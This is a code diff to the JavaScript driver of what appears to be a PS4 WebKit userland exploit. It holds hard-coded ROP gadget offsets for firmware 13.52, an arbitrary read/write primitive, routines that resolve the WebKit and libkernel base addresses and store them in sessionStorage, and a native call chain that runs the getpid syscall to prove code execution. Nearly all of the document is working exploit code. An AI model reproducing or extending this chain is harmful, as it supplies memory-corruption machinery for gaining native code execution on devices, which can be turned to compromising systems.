@@ -1,9 +1,11 @@
 import { int64 } from "./int64.js";
 import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
 import { installWindowP, pairStatus } from "./mem.js";
-import { runGetpidProof } from "./native_call.js";
+import { initNativeCall } from "./native_call.js";
 
-const BUILD_ID = "rw-20250827a";
+const BUILD_ID = "rw-20250827b";
+/** Skip heavy pointer map on Start unless ?rwproof=1 (saves memory for native call) */
+const SKIP_RW_PROOF = params.get("rwproof") !== "1";
 const HW_GADGETS_1352 = {
     wk_POP_RDI_RET: 0x4be55,
     wk_POP_RSI_RET: 0x7acb3,
@@ -309,12 +311,36 @@ function resolveWebkitBase(off, nativeFn) {
     return null;
 }
 
+async function freeBeforeNative() {
+    retained.length = 0;
+    pointers.length = 0;
+    renderMap();
+    if (lines.length > 4) {
+        lines.splice(0, lines.length - 4);
+        if (outEl) outEl.textContent = lines.join("\n");
+    }
+    if (exploit && exploit.trimExploitDebris)
+        exploit.trimExploitDebris();
+    await new Promise(r => setTimeout(r, 200));
+}
+
+function seedNativeSession(p, off) {
+    const fn = captureNativeFnQuick(p, off);
+    if (fn) {
+        try { sessionStorage.setItem("wk-nativeFn", String(fn)); } catch (_) { }
+        const base = resolveWebkitBase(off, fn);
+        if (base) try { sessionStorage.setItem("wk-webkitBase", String(base)); } catch (_) { }
+    }
+    return fn;
+}
+
 async function runNativeCall() {
     if (busy || !ready || !window.p) return;
     busy = true;
     setUi();
     const p = window.p;
     try {
+        await freeBeforeNative();
         const off = loadEffectiveOff();
         const nativeFn = captureNativeFnQuick(p, off);
         const webkitBase = resolveWebkitBase(off, nativeFn);
@@ -323,24 +349,35 @@ async function runNativeCall() {
             state("need cal base", "bad");
             return;
         }
-        mark("NATIVE-TRY", "base=" + webkitBase + " build=" + BUILD_ID);
-        if (exploit && exploit.trimExploitDebris)
-            exploit.trimExploitDebris();
-        await new Promise(r => setTimeout(r, 128));
         if (nativeChain) {
             nativeChain.disarm();
             nativeChain = null;
         }
-        const result = runGetpidProof(p, off, { webkitBase, nativeFn, log: mark });
-        nativeChain = result.chain;
-        if (result.ok) {
-            mark("NATIVE-OK", "getpid=" + result.pid + " getuid=" + result.uid);
-            state("native call OK pid=" + result.pid, "ok");
+        mark("NATIVE-TRY", "base=" + webkitBase + " build=" + BUILD_ID + " (trust, lite)");
+        const chain = initNativeCall(p, off, {
+            webkitBase,
+            nativeFn,
+            log: mark,
+            trust: true,
+            noStubScan: true,
+        });
+        nativeChain = chain;
+        try {
+            sessionStorage.setItem("wk-libkernelBase", String(chain.libkernelBase));
+        } catch (_) { }
+        const pid = chain.sc(20).i32;
+        if (pid > 0) {
+            mark("NATIVE-OK", "getpid=" + pid);
+            state("native call OK pid=" + pid, "ok");
         } else {
-            mark("NATIVE-FAIL", "getpid=" + result.pid);
-            state("native call returned pid<=0", "bad");
+            mark("NATIVE-FAIL", "getpid=" + pid);
+            state("getpid returned <=0", "bad");
         }
     } catch (err) {
+        if (nativeChain) {
+            try { nativeChain.disarm(); } catch (_) { }
+            nativeChain = null;
+        }
         mark("NATIVE-FAIL", err.message || String(err));
         state("native call failed", "bad");
     } finally {
@@ -496,16 +533,21 @@ async function runStart() {
         mark("PRIMITIVE-OK", "arb rw live");
         mark("PAIR-STATUS", "state=" + pairStatus.state);
 
-        const offKey = detected.key || "13.52";
         const off = loadEffectiveOff();
-        const ok = await runRwProof(p, off);
-
-        ready = true;
-        if (ok) {
-            state("RW-ONLY-OK — tap addresses or peek", "ok");
-            mark("RW-ONLY-OK", pointers.length + " pointers mapped");
+        if (SKIP_RW_PROOF) {
+            seedNativeSession(p, off);
+            mark("START-LITE", "rw proof skipped (add ?rwproof=1 for full map)");
+            ready = true;
+            state("primitive OK — tap Native call", "ok");
         } else {
-            state("primitive OK — some rw checks failed", "warn");
+            const ok = await runRwProof(p, off);
+            ready = true;
+            if (ok) {
+                state("RW-ONLY-OK — tap addresses or peek", "ok");
+                mark("RW-ONLY-OK", pointers.length + " pointers mapped");
+            } else {
+                state("primitive OK — some rw checks failed", "warn");
+            }
         }
     } catch (err) {
         state("failed: " + err.message, "bad");
